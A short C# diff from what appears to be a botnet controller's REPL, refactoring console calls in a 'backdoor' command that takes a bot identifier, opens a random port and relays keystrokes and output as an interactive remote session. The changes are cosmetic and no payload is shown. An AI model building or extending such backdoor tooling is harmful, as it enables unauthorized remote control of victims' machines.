@@ -47,8 +47,8 @@ namespace REPL.Commands
                 }
                 if (string.IsNullOrEmpty(BotId))
                 {
-                    _repl.Console.WriteLine("commands: Missing required argument `--bot=BOT-IDENTIFIER`.");
-                    _repl.Console.WriteLine("commands: Use `help backdoor` for details.");
+                    Console.WriteLine("commands: Missing required argument `--bot=BOT-IDENTIFIER`.");
+                    Console.WriteLine("commands: Use `help backdoor` for details.");
                     return 1;
                 }
                 var port = new Random().Next(33000, 33999);
@@ -79,7 +79,7 @@ namespace REPL.Commands
                         int count;
                         while ((count = reader.Read(array, 0, array.Length)) != 0)
                         {
-                            _repl.Console.Write(new string(array, 0, count));
+                            Console.Write(new string(array, 0, count));
                         }
                     }
                     catch (Exception e)
@@ -92,14 +92,14 @@ namespace REPL.Commands
                 var cursorLeft = 0;
                 while (true)
                 {
-                    k = _repl.Console.ReadKey(true);
+                    k = Console.ReadKey(true);
                     writer.Write(k.KeyChar);
-                    _repl.Console.Write(k.KeyChar.ToString());
+                    Console.Write(k.KeyChar.ToString());
                     if (k.Key == ConsoleKey.Enter)
                     {
-                        _repl.Console.CursorLeft -= cursorLeft;
+                        Console.CursorLeft -= cursorLeft;
                         cursorLeft = 0;
-                        writer.Write('\n');
+                        writer.WriteLine();
                     }
                     else
                     {
